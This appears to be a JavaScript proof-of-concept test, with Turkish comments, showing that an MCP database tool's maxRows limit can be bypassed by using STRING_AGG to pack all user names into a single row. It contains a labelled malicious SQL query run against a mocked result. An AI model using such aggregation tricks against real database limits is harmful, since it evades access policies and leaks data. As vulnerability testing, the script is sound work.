import { Governance } from '../src/governance.js'

// 3. MAX-ROWS BYPASS
// Zafiyet: MCP aracı "maxRows" limitini (örneğin 100 satır), sadece dönen JS satır sayısına (result.rows.slice(0, cap)) uygular.
// Saldırgan, SQL'in STRING_AGG, JSON_AGG veya ARRAY_AGG fonksiyonlarını kullanarak
// milyonlarca satırı tek bir satırda (string veya array olarak) birleştirebilir.
// Böylece result.rowCount = 1 olur, cap uygulanmaz ve tüm veri çekilir!

const policy = { maxRows: 1 } // Sadece 1 satıra izin ver!
const gov = new Governance(policy)

// Milyonlarca kullanıcının adını tek bir hücrede toplayan saldırgan sorgusu
const maliciousQuery = "SELECT STRING_AGG(name, ', ') AS all_users FROM users"

const mockDbResult = {
  sql: maliciousQuery,
  rowCount: 1, // Sadece 1 satır döndü!
  fields: ["all_users"],
  rows: [
    { all_users: "Alice, Bob, Charlie, Dave, Eve, ..., 1_000_000_More_Users" }
  ]
}

const cap = gov.maxRows()
const finalRows = mockDbResult.rows.slice(0, cap)

console.log("=== MAX-ROWS BYPASS TEST ===")
console.log("Policy maxRows:", policy.maxRows)
console.log("Query:", maliciousQuery)
console.log("Returned Rows:", finalRows.length)
console.log("Data size leaked:", finalRows[0].all_users.length, "characters")
console.log("BYPASS SUCCESS?", finalRows[0].all_users.includes("Alice, Bob") ? "YES (All data in 1 row!)" : "NO")
